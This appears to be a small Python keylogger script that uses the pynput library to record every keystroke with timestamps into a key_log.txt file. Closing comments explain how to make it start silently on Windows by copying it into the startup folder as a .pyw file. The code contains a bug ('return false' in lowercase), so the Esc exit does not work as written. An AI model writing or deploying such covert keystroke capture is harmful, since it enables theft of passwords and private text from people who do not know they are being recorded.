#!/bin/env python3
# coding: utf-8 

from pynput.keyboard import Key, Listener #from lib
import logging # vanilla package

log_dir = ""


def on_press(key):
	logging.info(str(key))
	if key == Key.esc:
		return false


def main():
	logging.basicConfig(
		filename=(log_dir + "key_log.txt"),
		level=logging.DEBUG,
		format="%(asctime)s: %(message)s:")

	with Listener(on_press=on_press) as listener:
		print(listener.join())


if __name__ == "__main__":
    main()






# for autostart:
# windows+R -> shell:startup
# copy keylogger in this folder
# change path in keylogger.pyw
